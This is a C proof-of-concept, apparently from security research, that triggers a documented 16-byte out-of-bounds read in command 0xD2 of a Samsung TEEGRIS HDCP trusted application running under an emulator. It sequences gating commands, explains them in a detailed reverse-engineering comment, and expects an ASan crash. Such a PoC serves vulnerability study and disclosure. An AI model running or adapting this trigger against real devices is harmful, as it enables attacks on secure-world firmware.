/* HDCP cmd 0xD2 (TZ_LC_Send_L_prime_T) — Finding #2, LOW CWE-125 OOB read.
 *
 * Emulator build S921BXXS9BYH20Y0: handler sub_11330. Fast path:
 *     if (byte_23734 && byte_23735)
 *         if (TEE_MemCompare(req + 1, algn_236FE, 16)) return -202;   // 16-B read, NO req_size guard
 * With req TEE_Malloc'd at the REE-supplied size (min 1), a req_size=1 call
 * over-reads 16 B at req+1 — straight into the asan after-redzone, which
 * begins exactly at req+1 for a 1-byte allocation. TEE_MemCompare asan-checks
 * its first operand (gp_api.py:403) => expect an OOB-read CRASH signal.
 *
 * Reaching the fast path needs byte_23734 && byte_23735, each set by a prior
 * command that is itself gated behind byte_23401 (entry gate sub_AA84 -> LABEL_13):
 *   cmd 0xE6 HW_Init        -> open("/dev/crypto")=fd5>0 -> ret 0 -> byte_23401=1   (gate LABEL_10, ungated)
 *   cmd 0x77 Transmitter_Info_R(req_size>=6) -> byte_23734 = req[5]&1 (DIRECT req read)
 *   cmd 0x78 Receiver_Info_R(resp>=6)        -> byte_23735 = 1 (unconditional)
 *   cmd 0xD2 L_prime_T (req_size=1)           -> fast-path 16-B OOB read
 *
 * EMULATOR QUIRK: cmd 0xDB (sub_F000) ALSO sets byte_23734, but via
 * "byte_23734 = resp[5]&1" where resp[5] is written into the TA's own copy of
 * the OUTPUT param buffer. The emulator syncs the output buffer back to REE
 * shm by length-truncation, and the in-TA resp write does not persist into the
 * .bss flag in this build -> byte_23734 stays 0 after 0xDB. cmd 0x77 reads the
 * INPUT buffer directly (req[5]&1), so it is the reliable setter here. This is
 * an emulator artifact and does not affect the bug: on-device either command
 * sets the flag. Confirmed by reading .bss byte_23734 directly (mem[23734]):
 *   after 0xE6=00  after 0xDB=00(quirk)  after 0x77=01  after 0x78=01.
 */
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337 2>/dev/null");
    system("ipcrm -M 0x13338 2>/dev/null");
    system("ipcrm -M 0x13339 2>/dev/null");
    system("ipcrm -M 0x1333a 2>/dev/null");
#endif
}

static uint32_t fire(TEEC_Session *s, uint32_t cmd, uint8_t *req, uint32_t rqsz,
                     uint8_t *resp, uint32_t rpsz, const char *label)
{
    TEEC_Operation op; uint32_t eo = 0;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INOUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = req;  op.params[0].tmpref.size = rqsz;
    op.params[1].tmpref.buffer = resp; op.params[1].tmpref.size = rpsz;
    printf("[poc] >>> cmd 0x%-3x %-20s req_size=0x%x resp_size=0x%x\n", cmd, label, rqsz, rpsz);
    TEEC_Result r = TEEC_InvokeCommand_impl(s, cmd, &op, &eo);
    printf("[poc] <<< cmd 0x%-3x ret=0x%x (%d) origin=0x%x\n", cmd, r, (int)r, eo);
    return r;
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-000048444350";
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;

    cleanup_shm();
    load_functions();
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) { printf("OpenSession failed 0x%x\n", res); exit(-1); }
    printf("[poc] session opened\n");

    uint8_t *req  = (uint8_t*)allocate_param_mem(&context, 0x1000);
    uint8_t *resp = (uint8_t*)allocate_param_mem(&context, 0x1000);
    if (!req || !resp) { printf("[poc] alloc failed\n"); exit(-1); }

    /* 1) HW_Init -> byte_23401 = 1 (opens /dev/crypto, modeled fd>0) */
    memset(req, 0, 0x1000);
    fire(&session, 0xE6, req, 0x10, resp, 0x40, "HW_Init");
    /* 2) Transmitter_Info_T: req_size>=2, req[1]==0 -> byte_23734 = a4[5]&1 */
    memset(req, 0, 0x1000);   /* req[1] = 0 */
    memset(resp, 0xEE, 0x40); /* sentinel so we can see what the handler wrote */
    fire(&session, 0xDB, req, 0x10, resp, 0x40, "Transmitter_Info");
    printf("[poc] after 0xDB: resp[0..7] = %02x %02x %02x %02x %02x %02x %02x %02x  (byte_23734 = resp[5]&1 = %d)\n",
           resp[0],resp[1],resp[2],resp[3],resp[4],resp[5],resp[6],resp[7], resp[5]&1);
    /* 2b) cmd 0x77 sub_F1CC: req_size>=6 -> byte_23734 = req[5]&1 (direct req read) */
    memset(req, 0, 0x1000);
    req[5] = 1;               /* odd -> byte_23734 = 1 */
    fire(&session, 0x77, req, 0x10, resp, 0x40, "Transmitter_Info_R");
    /* 3) Receiver_Info_R: resp>=6 -> byte_23735 = 1 (unconditional) */
    memset(resp, 0xEE, 0x40);
    fire(&session, 0x78, req, 0x10, resp, 0x40, "Receiver_Info_R");
    printf("[poc] after 0x78: resp[0..7] = %02x %02x %02x %02x %02x %02x %02x %02x  (byte_23735 = resp[5]&1 = %d)\n",
           resp[0],resp[1],resp[2],resp[3],resp[4],resp[5],resp[6],resp[7], resp[5]&1);
    /* 4) L_prime_T with req_size=1 -> fast-path 16-B OOB read at req+1 */
    printf("[poc] --- firing cmd 0xD2 with req_size=1 (expect asan OOB-read) ---\n");
    fire(&session, 0xD2, req, 0x1, resp, 0x40, "L_prime_T(req=1)");

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
